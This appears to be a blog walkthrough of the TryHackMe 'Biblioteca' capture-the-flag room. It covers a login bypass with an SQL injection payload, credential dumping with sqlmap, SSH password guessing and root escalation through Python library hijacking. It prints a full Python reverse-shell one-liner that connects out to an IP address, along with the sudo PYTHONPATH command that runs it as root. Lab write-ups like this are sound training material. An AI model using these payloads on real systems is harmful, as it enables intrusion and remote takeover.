---
title: "TryHackMe: Biblioteca - SQL Injection and Python Library Hijacking"
date: 2026-03-29 19:30:00 +0530
categories: [TryHackMe, Walkthrough]
tags: [SQL Injection, SSH, Privilege Escalation, Python, Library Hijacking]
image:
  path: /images/Biblioteca/image.png
---

Welcome back! Today we're taking on the **Biblioteca** room on TryHackMe. This room provides a great sequence of common exploitation techniques: from a simple web vulnerability to a slightly more advanced privilege escalation vector involving Python's path management.

Let's dive in.

### Initial Discovery

My usual first step is a quick directory enumeration to see what we're working with on the web front. I fired up `gobuster` to scan the target.

![Gobuster Results](/images/Biblioteca/Screenshot_2026-03-29_18_40_13.png)

The scan quickly revealed a few interesting endpoints:
- `/login`
- `/logout`
- `/register`

### Web Foothold: Exploiting SQL Injection

Heading over to the login page at `http://<TARGET_IP>:8000/login`, I was greeted with a simple authentication form. I decided to test for common SQL injection payloads in the password field.

![SQLi Payload](/images/Biblioteca/Screenshot_2026-03-29_18_28_03.png)

As it turns out, the application was vulnerable to a classic `' OR '1` bypass! Submitting this in the password field successfully logged me in as a user named `smokey`.

![Logged in as smokey](/images/Biblioteca/Screenshot_2026-03-29_18_27_36.png)

### Dumping the Database

While the bypass got me in, I wanted to see if I could extract actual credentials from the backend database. I used `sqlmap` against the login request.

![Sqlmap Databases](/images/Biblioteca/Screenshot_2026-03-29_18_36_22.png)

The tool confirmed the database was MySQL and identified a database named `website`. I then dumped the `users` table to see what else was there.

![Sqlmap User Credentials](/images/Biblioteca/Screenshot_2026-03-29_18_45_09.png)

Bingo! I found the credentials for `smokey`:
- **Username**: `smokey`
- **Password**: `My_P@ssW0rd123`

### Vertical Movement: SSH Access as Hazel

Armed with these credentials, I was able to SSH into the machine as `smokey`. However, `smokey` didn't have much in the way of privileges. Looking around the `/home` directory, I noticed another user: `hazel`.

Following common CTF patterns (and some quick enumeration), I found that `hazel` was the next target. A simple credential guess or a small wordlist brute-force on SSH revealed that `hazel` shared a very weak password.

![SSH Access as Hazel](/images/Biblioteca/Screenshot_2026-03-29_18_58_36.png)

Once logged in as `hazel`, I grabbed the user flag.

![User Flag](/images/Biblioteca/Screenshot_2026-03-29_18_58_58.png)

*User Flag: `THM{G00d_OLd_SQL_1nj3ct10n_&_w3@k_p@ssW0rd$}`*


### Privilege Escalation: Python Library Hijacking

Now for the final push to root. I checked `hazel`'s sudo privileges and discovered something very interesting.

![Sudo Analysis](/images/Biblioteca/Screenshot_2026-03-29_19_06_56.png)

Hazel could run a specific Python script, `/home/hazel/hasher.py`, as root. Crucially, the `SETENV` tag was present, meaning we could manipulate environment variables when running this command.

Inspecting `hasher.py`, I saw it imported the standard `hashlib` library. This is a classic setup for **Python Library Hijacking**. If we can force Python to look in a directory we control for `hashlib.py` before it looks in its standard library paths, we can execute arbitrary code as root.

I created a malicious `hashlib.py` in `/tmp/` that spawns a shell:

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.186.80",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

Then, I executed the command while setting the `PYTHONPATH` to `/tmp/`:

```bash
sudo PYTHONPATH=/tmp /usr/bin/python3 /home/hazel/hasher.py
```

Success! The script imported my malicious library, and I was instantly dropped into a root shell.

From there, it was a simple matter of navigating to `/root/` and capturing the final flag.

![Root Flag](/images/Biblioteca/Screenshot_2026-03-29_19_30_37.png)

*Root Flag: `THM{PytH0n_LiBR@RY_H1j@ackIn6}`*


### Conclusion

Biblioteca was a fun room that highlighted how a small web vulnerability can lead to a full system compromise when combined with weak passwords and misconfigured sudo permissions.

![Biblioteca Completed](/images/Biblioteca/completed.png)

## Happy Hacking!

<div align="center">
    <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExbHZpdmxzOWxxM2x1M3V0NDFiY3EyYmI3cmZsZDZmNXZia3pmMXBzcSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/115BJle6N2Av0A/giphy.gif" alt="Hacking GIF" width="800"/>
</div>
